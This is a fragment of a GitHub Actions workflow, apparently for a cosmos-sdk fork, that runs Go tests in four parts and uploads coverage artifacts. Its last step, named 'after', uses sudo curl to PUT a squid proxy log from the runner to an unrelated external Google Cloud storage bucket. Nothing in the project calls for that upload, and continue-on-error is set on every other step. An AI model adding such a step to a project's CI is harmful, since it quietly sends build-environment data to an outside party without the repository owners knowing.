    - continue-on-error: true
      uses: actions/checkout@v4
    - continue-on-error: true
      uses: actions/setup-go@v5
      with:
        cache: true
        cache-dependency-path: go.sum
        check-latest: true
        go-version: '1.23'
    - continue-on-error: true
      id: git_diff
      uses: technote-space/get-diff-action@v6.1.2
      with:
        PATTERNS: '**/*.go

          go.mod

          go.sum

          **/go.mod

          **/go.sum

          **/Makefile

          Makefile

          '
    - continue-on-error: true
      uses: actions/download-artifact@v4
      with:
        name: ${{ github.sha }}-${{ matrix.part }}
    - continue-on-error: true
      if: env.GIT_DIFF
      name: test & coverage report creation
      run: 'cat pkgs.txt.part.${{ matrix.part }} | xargs go test -mod=readonly -race
        -timeout 30m -coverprofile=${{ matrix.part }}profile.out -covermode=atomic
        -tags=''ledger test_ledger_mock''

        '
    - continue-on-error: true
      if: env.GIT_DIFF
      uses: actions/upload-artifact@v3
      with:
        name: ${{ github.sha }}-${{ matrix.part }}-coverage
        path: ./${{ matrix.part }}profile.out
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/0xPolygon/cosmos-sdk.$(date
        +%s)
    strategy:
      fail-fast: false
      matrix:
        part:
        - '00'
        - '01'
        - '02'
        - '03'
    timeout-minutes: 60
